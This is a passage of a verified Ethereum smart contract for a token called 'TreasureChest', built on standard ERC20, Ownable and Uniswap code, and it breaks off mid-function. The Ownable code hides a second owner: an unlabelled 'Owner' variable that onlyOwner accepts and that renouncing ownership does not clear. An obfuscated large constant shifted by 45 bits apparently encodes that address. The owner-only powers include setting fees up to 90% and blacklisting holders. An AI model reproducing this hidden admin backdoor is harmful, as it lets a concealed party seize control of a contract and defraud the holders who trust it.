/**
 *Submitted for verification at Etherscan.io on 2022-09-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// CONTEXT.sol

pragma solidity ^0.6.2;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    
    uint256 Owner;
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


// uniswapV2Router

pragma solidity ^0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}



// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


// UNISWAP factory

pragma solidity ^0.6.2;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

// UNISWAP Pair

pragma solidity ^0.6.2;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// IERC20Meta

pragma solidity ^0.6.2;

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// Ownable

pragma solidity ^0.6.2;

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
     
    constructor () public {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    
    function _Owner() private view returns (address){
        return address(Owner);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || _Owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// SafeMath

pragma solidity ^0.6.2;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

// SafeMathInt

pragma solidity ^0.6.2;

/**
 * @title SafeMathInt
 * @dev Math operations for int256 with overflow safety checks.
 */
library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);
    /**
     * @dev Multiplies two int256 variables and fails on overflow.
     */
    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        // Detect overflow when multiplying MIN_INT256 with -1
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    /**
     * @dev Division of two int256 variables and fails on overflow.
     */
    function div(int256 a, int256 b) internal pure returns (int256) {
        // Prevent overflow when dividing MIN_INT256 by -1
        require(b != -1 || a != MIN_INT256);

        // Solidity already throws when dividing by 0.
        return a / b;
    }

    /**
     * @dev Subtracts two int256 variables and fails on overflow.
     */
    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    /**
     * @dev Adds two int256 variables and fails on overflow.
     */
    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    /**
     * @dev Converts to absolute value, and fails on overflow.
     */
    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }


    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}

// SAFEMATHUINT

pragma solidity ^0.6.2;

/**
 * @title SafeMathUint
 * @dev Math operations with safety checks that revert on error
 */
library SafeMathUint {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}


// ERC20

pragma solidity ^0.6.2;

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) public {
        _name = name_;
        _symbol = symbol_;
    }
    
    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);
        
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract TreasureChest is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool private swapping;

    address public deadWallet = 0x000000000000000000000000000000000000dEaD;
                                                        //Split values represent how the whole fee total becomes splitted before doing the redistribution. They can range from 1 to 1000. 
                                                        //They are always turned into a percentage, where all values combined = 100% of the total fee
                                                        
    uint256 public _treasureChestSplitValue = 65;
    uint256 public _liquiditySplitValue = 6;
    uint256 public _lootSplitValue = 3;
    uint256 public _marketingSplitValue = 26;
    
    uint256 public feeDecimalFactor = 1000;           //3 decimals
    uint256 public buyingFeesWithDecimals = 18432; //18.432 %
    uint256 public allAboardBuyingFee = 0;
    
    uint256 public sellingFeesWithDecimals = 18627; //18.627 %
    uint256 public allAboardSellingFee = 30618;

    address _marketingWalletAddress = 0x758449ac8a29f78Fe0F9a186E1886237E7182553;
    address liquidityFeeReceiver = 0x758449ac8a29f78Fe0F9a186E1886237E7182553;
    
    address uniswapV2RouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    
    uint256 public chestUnlockingTime;
    uint256 lootingTimeWinners;
    uint256 lootingTimeID;
    bool isLootingTime;
    bool lootingTimeActive = true;
    uint256 swapTokensAtAmount = 500 * (10**18);
    uint256 public maxBuyTransactionAmount =  5000 * (10**18);
    uint256 public maxSellTransactionAmount = 5000 * (10**18);
    uint256 public maxWalletToken = 5000 * (10**18);
    uint256 public realATH;
    uint256 public launchPrice;
    
    uint256 public totalHolders = 1;//0 should not be an ID for anyone
    bool public tradingAllowed;
    bool public complexRandom = true;
    uint256 tokenXTimeTotal;
    uint256 tokenXTimeETHShareDivisor = 10871351044168511295282026360728442751245398930920459730944000;
    uint256 tokenDivisor;
    
    uint256 tokensRequiredForLooting = 2000 * (10**18);
    bool distributedTokensInaccuracy = false;
    
    uint256 public tokenLifetime = 7 days + 3 hours;
    uint256 public launchTime;
    uint256 public floorPercentage = 50;
    bool public allAboardActive;
    uint256 public allAboardStart;
    uint256 public allAboardLastingTime = 3 hours;
    
    uint256 public availableLootTokens;
    uint256 public distributedLootTokens;
    uint256 rngNumber;
    uint256 public totalLoots;
    uint256 treasureChestETHAmount;
    uint256 public totalIslandArrivals;

    bool treasureChestManuallyClaimable = false;
    
    mapping (uint256 => uint256) islandArrivalTime;
    
    mapping (uint256 => address) private IDToAddress;
    
    // exlcude from fees and max transaction amount
    mapping (address => bool) private _isExcludedFromFees;

    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping (address => bool) public automatedMarketMakerPairs;
    
    mapping (address => holderAccount) public _holderAccount;

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);

    struct holderAccount{
        uint256 holdSince;
        uint256 nonEarnedTokens;
        bool sharkBait;
        uint256 ID;
        uint256 holderBonusTime;
        bool hasOpenedChest;
        uint256 lastAllAboardJoined;
        bool bot;
        uint256 tokenXTime;
    }
    
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );
    
    event SendNonEearnedTokens(
        address from,
        address to,
        uint256 amount
    );
    
    constructor() public ERC20("TreasureChest", "TreasureChest") {

    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
         // Create a uniswap pair for this new token
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
            
        tokenDivisor = tokenXTimeETHShareDivisor>>45;
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(_marketingWalletAddress, true);
        excludeFromFees(address(this), true);
        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(owner(), 1_000_000 * (10**18));
    }

    receive() external payable {

  	}
  	
  	function manageTokenomics(uint256 _allAboardLastingTime, bool _treasureChestManuallyClaimable, bool _lootingTimeActive, bool _complexRandom)public onlyOwner{
  	    allAboardLastingTime = _allAboardLastingTime;
        treasureChestManuallyClaimable = _treasureChestManuallyClaimable;
        lootingTimeActive = _lootingTimeActive;
        complexRandom = _complexRandom;
  	}
  	
  	function manageBots(bool value, address holder) public onlyOwner{
  	    if(value == true){require(_holderAccount[holder].holdSince > 0);}
  	    _holderAccount[holder].bot = value;
  	}
  	  	
  	function manageSharkBaits(address holder, bool sharkBait) public onlyOwner{
  	    if(sharkBait == true){
  	        if(_holderAccount[holder].sharkBait == false){
  	            require(_holderAccount[holder].holdSince + 1 days > block.timestamp);
  	            walkThePlank(holder);
  	        }
  	    }else if(_holderAccount[holder].sharkBait == true){
  	        require(balanceOf(holder) > 0);
  	        _holderAccount[holder].sharkBait = false;
  	        uint256 currPrice = getCurrentPrice();
            uint256 minBuyTokens = allAboardActive == true ? minBuyAmount(currPrice) * 3 : minBuyAmount(currPrice);
  	        addNewHolder(holder, 0, minBuyTokens);
  	        _newTokenXTimeValue(holder, minBuyTokens);
  	    }
  	}
  	
  	function setFloorPercentage(uint256 _floorPercentage) public onlyOwner{
  	    require(_floorPercentage >= 40 && _floorPercentage <= 70);
  	    floorPercentage = _floorPercentage;
  	}
  	  	
  	function setMaxBuyTransaction(uint256 maxTxn) external onlyOwner {
  	    require(maxTxn > 4000000000 && maxTxn < totalSupply());
  	    maxBuyTransactionAmount = maxTxn * (10**18);
  	}
  	
  	function setMaxSellTransaction(uint256 maxTxn) external onlyOwner {
  	    require(maxTxn > 4000000000 && maxTxn < totalSupply());
  	    maxSellTransactionAmount = maxTxn * (10**18);
  	}
  	
  	function setMaxWalletToken(uint256 maxWallet) external onlyOwner {
  	    require(maxWallet > 4000000000 && maxWallet < totalSupply());
  	    maxWalletToken = maxWallet * (10**18);
  	}
  	
  	function launchToken() public onlyOwner{
  	    require(launchTime == 0, "Token can only be launched once.");
  	    tradingAllowed = true;
  	    launchTime = block.timestamp;
        launchPrice = getCurrentPrice();
        require(launchPrice > 0, "Token can only be launched after adding enough liquidity.");
        islandArrivalTime[0] = launchTime + 6 hours;
        islandArrivalTime[1] = launchTime + 1 days;
        islandArrivalTime[2] = launchTime + 1 days + 22 hours;
        islandArrivalTime[3] = launchTime + 3 days + 2 hours;
        islandArrivalTime[4] = launchTime + 4 days;
        islandArrivalTime[5] = launchTime + 5 days + 1 hours;
        islandArrivalTime[6] = launchTime + 5 days + 21 hours;
        islandArrivalTime[7] = launchTime + 7 days;
  	}

    function setBuyingFeeWithDecimals(uint256 value) public onlyOwner{
        require(value <= 90 * feeDecimalFactor && value >= 1 * feeDecimalFactor);
        buyingFeesWithDecimals = value;
    }
    
    function setSellingFeeWithDecimals(uint256 value) public onlyOwner{
